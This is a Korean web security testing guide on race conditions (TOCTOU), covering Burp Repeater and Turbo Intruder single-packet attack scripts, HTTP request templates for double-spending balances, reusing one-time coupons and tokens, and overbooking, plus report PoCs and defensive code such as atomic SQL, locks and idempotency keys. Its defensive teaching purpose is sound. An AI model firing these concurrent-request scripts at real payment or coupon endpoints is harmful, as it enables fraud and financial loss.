---
sidebar_position: 25
title: 경쟁 상태 (Race Condition / TOCTOU)
description: 웹 진단 - Race Condition 점검 절차, Burp Turbo Intruder Single Packet Attack, 결제/쿠폰/포인트 시나리오, PoC
keywords: [Race Condition, TOCTOU, Concurrency, Turbo Intruder, Single Packet Attack, Burp Repeater, Idempotency, OWASP A06]
draft: false
---

# 경쟁 상태 (Race Condition / TOCTOU)

> 검증과 실행 사이의 시간차 (TOCTOU: Time Of Check / Time Of Use) 를 이용해 **한 번만 가능해야 하는 액션을 여러 번** 트리거.
> 결제 / 포인트 / 쿠폰 / 한정 자원 영역에서 단일 결함만으로 직접 금전 손실 / 자원 고갈.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A06:2025 - Insecure Design / KISA 비즈니스 로직 |
| **CWE** | [CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html), [CWE-367: TOCTOU Race Condition](https://cwe.mitre.org/data/definitions/367.html) |
| **영향도** | 🔴 (결제 / 포인트 / 쿠폰 / 한정 자원) / 🟡 (일반 데이터) |
| **점검 난이도** | 중 (Burp 기본 group send) / 상 (Turbo Intruder Single Packet Attack) |
| **예상 점검 시간** | 1 ~ 4시간 (후보 액션 수에 비례) |

---

## 점검 목적

두 개 이상의 요청이 동시에 처리될 때 **검증 시점과 실행 시점 사이의 시간차** (TOCTOU) 를 이용해 비즈니스 로직을 우회할 수 있는지 확인한다. "한 번만 가능해야 하는" 액션 (결제, 포인트 차감, 쿠폰 사용, 한정 자원 점유) 의 동시 요청 시 검증이 N개 요청 모두에 대해 통과되고 N번 적용되면 직접 금전 손실로 직결.

> **다른 페이지와 영역 분리**
> - 비즈니스 로직 일반 (시퀀스 우회, 가격 변조 등) → `business-logic.md`
> - Mass Assignment → `authorization-idor.md`
> - 인증 흐름 race 의 일부 (MFA / 비밀번호 재설정) 는 `authentication.md` 와 겹침 — 본 페이지는 **동시 요청 관점** 에서

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **금융 로직 race** | 잔액 / 포인트 / 마일리지 동시 차감 (한 잔액으로 여러 결제) |
| **1회성 토큰 / 쿠폰** | 같은 쿠폰 / 1회 사용 코드 동시 적용 → N번 적용됨 |
| **한정 자원 점유** | 좌석 / 수량 한정 상품 / 추첨권 다중 점유 |
| **유니크 제약 우회** | 회원가입 중복 ID / 이메일, 닉네임 중복 |
| **인증 흐름 race** | MFA / 비밀번호 재설정 토큰 검증과 무효화 사이 |
| **상태 전이 race** | "결제대기 → 결제완료" 같은 상태 변경 사이 환불 요청 등 |

---

## 진단 절차

### Step 1. 후보 액션 식별

"한 번만 가능해야 하는" / "유한 자원에 영향을 주는" 액션을 모두 매핑. 우선순위:

```
[금전]   결제, 포인트/마일리지 사용, 쿠폰 적용, 환불 요청, 송금
[자원]   좌석/수량 한정 상품 구매, 추첨 응모, 한정판 응모
[유니크] 회원가입 (이메일/ID), 닉네임 변경, 도메인/슬러그 등록
[인증]   MFA 토큰 사용, 비밀번호 재설정 토큰, 이메일 인증 링크
[상태]   결제 상태 전이, 주문 취소/환불, 권한 변경
[비금전] 친구 추가, 좋아요, 투표, 팔로우 (임팩트 낮음)
```

### Step 2. Burp Repeater group send (기본 시도)

Burp 2023.10+ 에서 **Single Packet Attack** (단일 TCP 패킷에 여러 요청 동시 도착) 지원:

```
1. 동일 요청을 Repeater 탭 N개에 복제 (Ctrl+R N번)
2. 탭들을 그룹으로 묶기 (탭 우클릭 → "Add tab to group")
3. 그룹 송신 옵션 선택:
   - "Send group in parallel (single connection)"   ← Single Packet Attack
   - "Send group in parallel (separate connections)"
   - "Send group in sequence (single connection)"
4. 응답 비교 — 모두 200 인지, DB 상태가 어떻게 변했는지 확인
```

기본 시도로 race 가능성이 보이면 Step 3 으로 정밀 측정.

### Step 3. Turbo Intruder 로 정밀 동시 요청

Turbo Intruder (Burp 확장) 는 동시성 정밀 제어 + Single Packet Attack 모두 지원. 20~50 동시 요청 발사로 가장 효과적:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,            # Single Packet Attack 모드
        requestsPerConnection=100,
        engine=Engine.BURP2
    )

    # 30개 요청을 같은 gate 에 묶어 동시 release
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # gate 열기 — 일제히 발사
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Step 4. 영향 입증

API 응답만으로는 부족 — DB 또는 후속 조회 API 로 실제 상태 변화 확인:

- 잔액 / 포인트 잔량 조회 → 음수 또는 비즈니스 로직과 불일치
- 쿠폰 사용 이력 조회 → 1회 쿠폰의 사용 이력이 N건
- 한정 자원 점유 조회 → N개 자원에 N+M 명 점유

---

## 페이로드 / 테스트 케이스

### 케이스 1: 결제 / 잔액 / 포인트 동시 차감

**언제 쓰는지**: 잔액 / 포인트를 차감하는 모든 액션. 점검 우선순위 최상위.

**전제 시나리오:**

```
[전제]   사용자 보유 잔액 5,000원
[액션]   3,000원 결제 요청을 동시에 20개 전송
[취약 결과]   20개 요청 모두 200 OK + 결제 성공 + 최종 잔액 음수 또는 0
[안전 결과]   1개만 성공 + 나머지 19개는 "잔액 부족" 응답
```

**Burp Repeater group send (Single Packet) 또는 Turbo Intruder 로 동시 발사:**

```http
POST /api/payment HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<session>
Content-Type: application/json

{"product_id": 42, "amount": 3000}
```

**판정**: 동시 N개 요청 중 2개 이상 200 OK + 최종 잔액 조회 (`GET /api/account/balance`) 가 음수 또는 비즈니스 로직과 불일치하면 취약. 백엔드가 `SELECT balance` 후 `UPDATE balance = balance - 3000` 으로 처리하면서 둘 사이가 같은 트랜잭션 / 락이 없는 패턴.

### 케이스 2: 쿠폰 / 1회성 토큰 중복 사용

**언제 쓰는지**: 1회 사용 쿠폰, 일회용 할인 코드, 추천인 코드, 일회용 인증 토큰.

**전제 시나리오:**

```
[전제]   1회 사용 가능한 5,000원 할인 쿠폰 발급
[액션]   같은 쿠폰 코드로 50개 주문 요청 동시 전송
[취약 결과]   50개 주문 모두에 쿠폰 적용 → 250,000원 할인
[안전 결과]   1개 주문에만 쿠폰 적용 + 나머지 49개는 "이미 사용된 쿠폰"
```

```http
POST /api/order HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<session>
Content-Type: application/json

{"items": [...], "coupon_code": "WELCOME5000"}
```

**판정**: 응답에 쿠폰 적용된 주문이 1개 초과 또는 후속 쿠폰 사용 이력 조회 시 사용 횟수가 1 초과면 취약. 백엔드가 "쿠폰 사용 여부 SELECT → 사용 처리 UPDATE" 흐름인데 두 단계 사이에 락이 없는 패턴.

### 케이스 3: 한정 자원 다중 점유

**언제 쓰는지**: 좌석 예매, 한정 수량 상품, 추첨권, 한정판 응모.

**전제 시나리오:**

```
[전제]   좌석 1개 또는 한정 상품 1개 남음
[액션]   동일 자원에 대한 점유 요청 100개 동시 전송
[취약 결과]   1개 자원에 N명 점유 성공 (오버부킹)
[안전 결과]   1명만 성공 + 나머지 99명은 "매진"
```

```http
POST /api/booking HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<session>
Content-Type: application/json

{"seat_id": "A12"}
```

**판정**: 동일 자원에 다수가 점유 성공 → 취약. 한정 수량 상품에서 발견 시 직접 금전 손실 (오버부킹 환불 / 사은품 추가 지급 등) 로 직결.

> 운영 환경에서 한정 자원 액션을 동시에 발사할 때는 사전 협의 필수. 진단 후 데이터 복원 협의 포함.

### 케이스 4: 유니크 제약 우회 (회원가입 / 닉네임)

**언제 쓰는지**: 회원가입 (이메일/ID), 닉네임 변경, 도메인/슬러그 등록 등 유니크해야 하는 필드.

**전제 시나리오:**

```
[전제]   이메일 victim@example.com 으로 가입 시도
[액션]   같은 이메일로 가입 요청 10개 동시 전송
[취약 결과]   같은 이메일로 N개 계정 생성
[안전 결과]   1개만 성공 + 나머지는 "이미 가입된 이메일"
```

```http
POST /api/signup HTTP/1.1
Host: <TARGET>
Content-Type: application/json

{"email": "victim@example.com", "password": "...", "name": "..."}
```

**판정**: 같은 이메일로 다수 계정 생성 시 취약. DB 레벨 unique constraint 가 없거나, "SELECT 검증 → INSERT" 사이에 race 발생. 영향: 동일 이메일 계정 다수 생성 → 추천 / 가입 보너스 N회 수령, 식별자 충돌 등.

### 케이스 5: 인증 흐름 race (MFA / 비밀번호 재설정 토큰)

**언제 쓰는지**: 1회 사용 후 무효화되는 인증 토큰 (이메일 인증 링크, 비밀번호 재설정 토큰, MFA 코드).

**전제 시나리오:**

```
[전제]   비밀번호 재설정 토큰 1개 발급 (1회만 사용 가능)
[액션]   같은 토큰으로 비밀번호 재설정 요청 2개 동시 전송
[취약 결과]   둘 다 성공 → 토큰 1회 사용 정책 우회
[안전 결과]   1개만 성공 + 두 번째는 "토큰 무효"
```

```http
POST /api/password/reset HTTP/1.1
Content-Type: application/json

{"token": "RESET_TOKEN", "new_password": "newPass!"}
```

**판정**: 둘 다 성공 시 취약. 직접 영향은 적지만, MFA bypass / 토큰 재사용 정책 우회 등 인증 흐름 신뢰도 손상 — 다른 결함과 결합 시 임팩트 상향.

### 케이스 6: Turbo Intruder Single Packet Attack 스크립트 예시

**언제 쓰는지**: Burp 기본 group send 로는 race window 가 좁아 재현이 어려울 때. 가장 강력한 도구.

**`coupon_race.py`:**

```python
def queueRequests(target, wordlists):
    # Single Packet Attack: 모든 요청을 같은 TCP 패킷으로 묶어 동시 도착
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2
    )

    # 50개 요청을 같은 gate 로 묶음 (gate 열릴 때까지 대기)
    for i in range(50):
        engine.queue(target.req, gate='race1')

    # 일제히 발사
    engine.openGate('race1')

def handleResponse(req, interesting):
    # 응답 상태/길이를 테이블에 기록 — 200 응답 수 확인
    table.add(req)
```

**Burp 의 Extender → Turbo Intruder → 요청 우클릭 "Send to turbo intruder" → 위 스크립트 붙여넣기 → Attack:**

- 결과 테이블에서 200 응답 개수 확인 → 1개 초과면 race 가능성
- 후속 DB 조회 또는 잔액/쿠폰 이력 API 로 실제 영향 입증

> Turbo Intruder 결과는 응답 코드만으론 판단 부족 — 응답 본문에 "쿠폰 적용됨" 같은 메시지가 N번 나오거나, DB 측 상태가 실제로 N번 변경됐는지 함께 확인.

### 그 외 — 한 줄 언급만 (실무 우선순위 낮음 / 별도 영역)

- **친구 추가 / 좋아요 / 투표 / 팔로우** — 비금전 영역. race 가능해도 임팩트 낮음
- **CSRF 토큰 1회용 race** — 동일 토큰 동시 사용 가능 여부. 임팩트 일반적으로 낮음
- **파일 업로드 race** — 검증 후 저장 사이 race 로 차단된 확장자 우회. `file-upload.md` 영역
- **CTF 류 (signal handler, OS 파일 시스템 race)** — 웹 진단 비대상

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 동시 N개 요청 중 2개 이상 정상 처리 (200 OK + 실제 적용) 되어야 안 되는 액션
- [ ] DB 상태가 비즈니스 로직과 불일치 (잔액 음수, 쿠폰 N회 적용 등)
- [ ] 한정 자원 N개에 N+M 명 점유
- [ ] 1회성 토큰 (비밀번호 재설정, MFA) 으로 N회 인증 / 적용 성공
- [ ] 유니크 제약 무력화 (중복 계정 / 닉네임 생성)

**오탐 주의:**

- [ ] 동시 N개 요청 중 1개만 성공 + 나머지 실패 → 정상 (락 적용됨)
- [ ] 응답은 200 이지만 실제 DB 변경은 1회만 적용 → 트랜잭션이 작동한 것. **응답 코드만으로 판정 금지**, 반드시 후속 상태 조회로 검증
- [ ] 멱등성 키 (`Idempotency-Key` 헤더) 가 적용된 환경에서 같은 키로 보내 1회만 처리되는 건 정상
- [ ] 한정 자원 / 결제 액션은 사전 협의 필수 — 운영 환경에서 함부로 동시 발사 금지
- [ ] race 윈도우가 매우 좁은 경우 (DB 락이 있지만 짧은 시점 race 가능) 도 있음 — 50~100 동시까지 늘려서 재시도

---

## PoC 양식 (보고서 붙여넣기용)

### PoC 1 — [Race Condition] 쿠폰 중복 사용으로 인한 다중 할인 적용

1. 1회 사용 가능한 5,000원 할인 쿠폰 (`WELCOME5000`) 발급
2. Turbo Intruder 로 동일 쿠폰 코드를 사용한 주문 요청 50개를 Single Packet Attack 으로 동시 전송
3. 응답 50개 모두 200 OK + 주문 50건 모두에 쿠폰 할인 적용
4. 후속 조회 — 쿠폰 사용 이력 50건 + 250,000원 할인 적용

**Turbo Intruder 스크립트:**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2
    )
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**전송된 요청 (50개 동시):**

```http
POST /api/order HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<attacker_session>
Content-Type: application/json

{"items": [{"product_id": 101, "qty": 1}], "coupon_code": "WELCOME5000"}
```

**응답 — 취약 발현 증거:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "order_id": "ORD-2026-05-13-001",
  "status": "completed",
  "discount_applied": 5000,
  "coupon_code": "WELCOME5000"
}
```
(동일 응답이 50회 발생)

**후속 검증 — 쿠폰 사용 이력 조회:**

```http
GET /api/coupons/WELCOME5000/history HTTP/1.1
Cookie: SESSION=<attacker_session>

HTTP/1.1 200 OK
Content-Type: application/json

{
  "coupon_code": "WELCOME5000",
  "usage_limit": 1,
  "usage_count": 50,           ← 1회 쿠폰이 50회 사용됨
  "total_discount": 250000
}
```

**확인 사항:**
- 1회 사용 가능 쿠폰이 50회 적용됨 — `usage_count` 가 `usage_limit` 의 50배
- 50개 주문 모두 정상 처리 + 할인 적용됨 → 직접 금전 손실 250,000원
- 백엔드가 "쿠폰 사용 여부 SELECT → 사용 처리 UPDATE" 흐름에서 SELECT 와 UPDATE 사이가 같은 트랜잭션 / 비관적 락이 없음 → 동시 50개 요청 모두 SELECT 시점에 "미사용" 통과
- 다수 사용자가 같은 패턴으로 악용 시 쿠폰/프로모션 전체 손실 — 마케팅 캠페인 단위 피해

---

### PoC 2 — [Race Condition] 잔액 음수로 인한 무한 결제

1. 사용자 계정 잔액 5,000원 보유
2. 3,000원 결제 요청을 Burp Repeater group send (Single Packet) 으로 20개 동시 전송
3. 20개 응답 모두 200 OK + 결제 성공
4. 후속 잔액 조회 — 잔액 -55,000원 (음수)

**요청 (20개 동시):**

```http
POST /api/payment HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<attacker_session>
Content-Type: application/json

{"product_id": 42, "amount": 3000}
```

**응답 — 취약 발현 증거 (20회 동일):**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "payment_id": "PAY-2026-05-13-001",
  "status": "completed",
  "amount": 3000,
  "remaining_balance": 2000
}
```
(`remaining_balance` 가 매번 2000 으로 응답됨 — 모든 요청이 동일 시점의 잔액 5000 을 봤기 때문)

**후속 검증 — 잔액 조회:**

```http
GET /api/account/balance HTTP/1.1
Cookie: SESSION=<attacker_session>

HTTP/1.1 200 OK
Content-Type: application/json

{
  "user_id": 42,
  "balance": -55000           ← 잔액 음수 (보유 5000 - 결제 60000)
}
```

**확인 사항:**
- 보유 잔액 5,000원 + 3,000원 결제 20회 동시 → 60,000원 결제 적용
- 검증 단계 (잔액 ≥ 3000) 가 20개 요청 모두에 대해 동시에 통과 → 차감이 모두 적용되어 잔액 -55,000
- 백엔드가 `SELECT balance` 후 `UPDATE balance = balance - 3000` 을 분리된 트랜잭션 또는 락 없는 트랜잭션으로 처리 → race 발생
- 안전 패턴: `UPDATE balance = balance - 3000 WHERE user_id = ? AND balance >= 3000` 단일 SQL 로 처리하면 원자적 검증+차감
- 직접 금전 손실 — 공격자가 음수 잔액으로도 무한 결제 가능

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🟡 — 직접 정보 노출은 적음
- **무결성 (Integrity)**: 🔴 — DB 상태 불일치, 금전 손실, 자원 고갈
- **가용성 (Availability)**: 🟡 — 한정 자원 고갈 시 정상 사용자 거부
- **추가 위협**:
  - **직접 금전 손실** — 포인트 / 쿠폰 / 잔액 음수 / 마일리지 다중 적용
  - **한정 자원 매점** — 티켓 / 추첨 / 한정판 상품 오버부킹 → 환불 / 사은품 / 명성 손실
  - **유니크 식별자 충돌** — 같은 이메일로 다수 계정 생성 → 가입 보너스 다회 수령
  - **인증 신뢰도 손상** — 1회 토큰 다회 사용으로 비밀번호 재설정 / MFA 정책 우회

**비즈니스 임팩트:**
Race Condition 은 단일 결함으로 직접 금전 손실로 이어지는 카테고리 (잔액 음수, 쿠폰 다중 적용, 한정 자원 매점). 임팩트가 직접적이고 가시적이라 비즈니스 측면에서 신뢰도 손상도 큼. 모던 Burp + Turbo Intruder 의 Single Packet Attack 으로 재현이 쉬워졌으므로, 결제 / 자원 영역 액션은 모두 점검 항목에 포함시켜야 함.

---

## 대응방안

### 개발자 관점 (필수)

1. **단일 SQL 로 검증 + 실행 통합** — 가장 단순하고 확실:

   ```sql
   -- 위험 — 두 단계 분리
   SELECT balance FROM accounts WHERE user_id = ?;          -- 검증
   UPDATE accounts SET balance = balance - 3000 WHERE user_id = ?;   -- 실행

   -- 안전 — WHERE 조건이 검증 + 차감이 원자적
   UPDATE accounts SET balance = balance - 3000
   WHERE user_id = ? AND balance >= 3000;
   -- affected rows = 1 이면 성공, 0 이면 잔액 부족
   ```

2. **DB 트랜잭션 + 적절한 격리 수준 또는 비관적 락** — 단일 SQL 로 못 풀리는 복잡 흐름:
   - `SELECT ... FOR UPDATE` (비관적 락)
   - `SERIALIZABLE` 격리 수준 (가장 강하지만 성능 영향)
   - 낙관적 락 (`version` 컬럼 + `UPDATE ... WHERE version = ?` + 실패 시 재시도)

3. **분산 락** (서비스가 분산 환경 / 멀티 인스턴스):
   - Redis: `SET <key> <val> NX EX <ttl>` 또는 Redlock
   - ZooKeeper / etcd
   - 단일 인스턴스 인-메모리 락은 멀티 인스턴스에서 무효

4. **멱등성 키 (`Idempotency-Key` 헤더)** — Stripe / Square 등 결제 API 의 표준:
   - 클라이언트가 요청마다 고유 키 생성 (UUID)
   - 서버가 키별로 결과 캐싱 → 중복 요청은 캐시된 결과 반환
   - 결제 / 송금 / 환불 등 금전 액션 표준

5. **데이터 모델 단위 unique constraint** — DB 레벨에서 보장:

   ```sql
   CREATE UNIQUE INDEX idx_users_email ON users(email);
   CREATE UNIQUE INDEX idx_coupons_user_coupon ON coupon_usage(user_id, coupon_id);
   ```

6. **상태 머신 명시** — 결제 / 주문 상태 전이를 트랜잭션 내에서 검증:

   ```sql
   UPDATE orders SET status = 'COMPLETED'
   WHERE id = ? AND status = 'PENDING';
   -- affected rows = 1 이면 전이 성공, 0 이면 이미 다른 상태
   ```

### 운영자 관점

1. **이상 패턴 모니터링** — 단일 IP / 세션에서 짧은 시간 (1초 이내) 에 동일 액션 다수 시도 탐지 / 알람.

2. **한정 자원 액션 로깅** — 결제 / 쿠폰 / 한정 자원 모든 요청 로깅. 사고 시 추적 + 보상 대응.

3. **레이트 리미팅** — 사용자/IP 단위 RPS 제한 (race 자체를 막진 못하지만 대규모 악용 차단).

### 안전 / 위험 코드 비교 (스택별)

**Python (SQLAlchemy):**

```python
# 위험 — 검증과 차감이 분리
def pay(user_id, amount):
    user = session.query(User).filter_by(id=user_id).first()
    if user.balance < amount:
        return {"error": "insufficient"}
    user.balance -= amount               # 다른 동시 요청과 race
    session.commit()
    return {"status": "ok"}

# 안전 1 — 비관적 락
def pay(user_id, amount):
    with session.begin():
        user = session.query(User).filter_by(id=user_id)\
            .with_for_update().first()    # SELECT ... FOR UPDATE
        if user.balance < amount:
            return {"error": "insufficient"}
        user.balance -= amount
    return {"status": "ok"}

# 안전 2 — 단일 UPDATE 로 검증 + 차감
def pay(user_id, amount):
    result = session.execute(
        text("UPDATE accounts SET balance = balance - :amount "
             "WHERE user_id = :uid AND balance >= :amount"),
        {"amount": amount, "uid": user_id}
    )
    session.commit()
    if result.rowcount == 0:
        return {"error": "insufficient"}
    return {"status": "ok"}
```

**Java (Spring + JPA):**

```java
// 위험 — 트랜잭션 / 락 없음
@Transactional
public void pay(Long userId, int amount) {
    User user = userRepo.findById(userId).get();
    if (user.getBalance() < amount) throw new InsufficientBalance();
    user.setBalance(user.getBalance() - amount);
    userRepo.save(user);
}

// 안전 1 — 비관적 락
@Transactional
public void pay(Long userId, int amount) {
    User user = userRepo.findByIdForUpdate(userId);    // SELECT ... FOR UPDATE
    if (user.getBalance() < amount) throw new InsufficientBalance();
    user.setBalance(user.getBalance() - amount);
}

// Repository
@Lock(LockModeType.PESSIMISTIC_WRITE)
@Query("SELECT u FROM User u WHERE u.id = :id")
User findByIdForUpdate(@Param("id") Long id);

// 안전 2 — 단일 UPDATE
@Modifying
@Query("UPDATE User u SET u.balance = u.balance - :amount " +
       "WHERE u.id = :id AND u.balance >= :amount")
int deductBalance(@Param("id") Long id, @Param("amount") int amount);

// 호출 시 rowsAffected == 0 이면 잔액 부족
```

**Node.js (Sequelize):**

```javascript
// 위험 — 검증과 차감 분리
async function pay(userId, amount) {
    const user = await User.findByPk(userId);
    if (user.balance < amount) throw new Error('insufficient');
    user.balance -= amount;
    await user.save();
}

// 안전 1 — 트랜잭션 + 락
async function pay(userId, amount) {
    return sequelize.transaction(async (t) => {
        const user = await User.findByPk(userId, {
            lock: t.LOCK.UPDATE,             // SELECT ... FOR UPDATE
            transaction: t,
        });
        if (user.balance < amount) throw new Error('insufficient');
        user.balance -= amount;
        await user.save({ transaction: t });
    });
}

// 안전 2 — 단일 UPDATE
async function pay(userId, amount) {
    const [affected] = await sequelize.query(
        `UPDATE accounts SET balance = balance - :amount
         WHERE user_id = :uid AND balance >= :amount`,
        { replacements: { amount, uid: userId }, type: QueryTypes.UPDATE }
    );
    if (affected === 0) throw new Error('insufficient');
}
```

**Redis 분산 락 (멀티 인스턴스):**

```python
import redis
r = redis.Redis()

def pay_with_lock(user_id, amount):
    lock_key = f"lock:user:{user_id}"
    # NX: 키가 없을 때만 SET (분산 락 획득), EX: TTL 5초 (데드락 방지)
    acquired = r.set(lock_key, '1', nx=True, ex=5)
    if not acquired:
        return {"error": "busy, try again"}

    try:
        # 락 보호 구간 — race-free
        user = session.query(User).filter_by(id=user_id).first()
        if user.balance < amount:
            return {"error": "insufficient"}
        user.balance -= amount
        session.commit()
        return {"status": "ok"}
    finally:
        r.delete(lock_key)
```

**멱등성 키 (모든 스택 공통 패턴):**

```python
@app.route('/api/payment', methods=['POST'])
def payment():
    idem_key = request.headers.get('Idempotency-Key')
    if not idem_key:
        return {"error": "Idempotency-Key required"}, 400

    # Redis 캐시 키로 사용
    cache_key = f"idem:{idem_key}"
    cached = r.get(cache_key)
    if cached:
        return json.loads(cached)        # 같은 키로 들어온 중복 요청은 캐시 반환

    # 처리 + 결과 캐시
    result = process_payment(...)
    r.setex(cache_key, 86400, json.dumps(result))    # 24시간 캐시
    return result
```

---

## 참고자료

- [OWASP - Testing for Race Conditions](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Race_Conditions)
- [PortSwigger Research - Smashing the state machine: the true potential of web race conditions (James Kettle)](https://portswigger.net/research/smashing-the-state-machine)
- [PortSwigger - Race conditions](https://portswigger.net/web-security/race-conditions)
- [Turbo Intruder GitHub](https://github.com/PortSwigger/turbo-intruder)
- [HackTricks - Race Condition](https://book.hacktricks.xyz/pentesting-web/race-condition)
- [Stripe Engineering - Designing robust and predictable APIs with idempotency](https://stripe.com/blog/idempotency)
- [Martin Kleppmann - How to do distributed locking](https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html)
